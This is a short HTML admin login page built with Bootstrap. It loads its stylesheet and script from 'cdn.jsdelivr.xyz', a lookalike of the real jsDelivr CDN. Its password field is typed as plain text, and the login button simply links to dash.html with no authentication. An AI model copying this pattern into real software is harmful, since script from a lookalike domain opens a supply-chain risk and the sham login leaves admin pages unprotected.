<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link href="https://cdn.jsdelivr.xyz/npm/bootstrap@5.3.1/dist/css/bootstrap.min.css" rel="stylesheet"
        integrity="sha384-4bw+/aepP/YC94hEpVNVgiZdgIC5+VKNBQNGCHeKRQN+PtmoHDEXuppvnDJzQIu9" crossorigin="anonymous">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <title>Document</title>
</head>

<body class="bg-light">
    <div class="container">
        <div class="row justify-content-center">
            <div class="col-md-4">
                <div class="card mt-5 shadow mb-5">
                    <div class="card-header text-bg-primary"> Login as admin </div>
                    <div class="card-body">
                        <form action="dash.html">
                            <div class="form-floating mb-3">
                                <input type=" text" id="UserName" placeholder="UserName" class="form-control" autofocus>
                                <label for="UserName">UserName</label>
                            </div>

                            <div class="form-floating mb-3">
                                <input type=" text" id="Password" placeholder="Password" class="form-control" autofocus>
                                <label for="Password">Password</label>
                            </div>

                            <div class="form-check mb-3">
                                <label class="form-check-label" for="Remember Me">Remember Me</label>
                                <input type="checkbox" class="form-check-input" id="Remember Me">
                            </div>

                            <div>
                                <a class="d-grid " href="./dash.html" style="text-decoration: none;"><button
                                        type="submit" class="btn btn-success"><i
                                            class="fa-solid fa-right-to-bracket"></i>
                                        Login as admin</button></a>
                            </div>
                        </form>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <script src="https://cdn.jsdelivr.xyz/npm/bootstrap@5.3.1/dist/js/bootstrap.bundle.min.js"
        integrity="sha384-HwwvtgBNo3bZJJLYd8oVXjrBZt8cqVSpeBNS5n7C8IVInixGAoxmnlMuBnhbgrkm"
        crossorigin="anonymous"></script>
</body>

</html>
